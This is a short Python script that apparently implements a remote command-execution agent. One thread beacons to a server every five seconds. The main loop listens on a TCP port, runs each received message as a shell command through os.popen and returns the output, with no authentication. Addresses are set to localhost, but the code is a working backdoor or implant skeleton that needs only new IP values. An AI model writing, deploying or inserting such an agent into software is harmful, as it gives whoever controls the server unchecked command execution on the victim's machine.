#!/usr/bin/python3

import os
import time
import socket
import threading

CLIENT_IP	= '127.0.0.1' 
CLIENT_PORT 	= 10011
SERVER_KA_IP 	= '127.0.0.1'
SERVER_KA_PORT	= 10010

def keepAliveToServerThreaded(SIP, SPORT):
	while True:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as karoot:

			try:
				karoot.connect((SIP,SPORT))
				karoot.send("HelloWorld".encode("utf-8"))
			except socket.error as error:
				print(f"{error}")

			karoot.close()

		time.sleep(5)

def waitForConnections():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cnroot:
		
		try:
			cnroot.bind((CLIENT_IP, CLIENT_PORT))
			cnroot.listen(1)

		except socket.error as error:
			exit(1)

		message = ""
		while ( message != "Finalize" ):
			# TODO: HANDLE WHEN THE SERVER STOPS THE CONNECTION THEN IT STABLISHES IT AGAIN
			
			clientSock, ConnData = cnroot.accept()
			heloMessage = clientSock.recv(1024).decode("utf-8")
			message = clientSock.recv(1024).decode("utf-8")

			if ( message != "Finalize" ):
				output = os.popen(f"{message}").read()
				clientSock.send(output.encode("utf-8"))
			else:
				clientSock.close()
				
if __name__ == "__main__":
	threading.Thread(target=keepAliveToServerThreaded, args=(SERVER_KA_IP, SERVER_KA_PORT)).start()
	waitForConnections()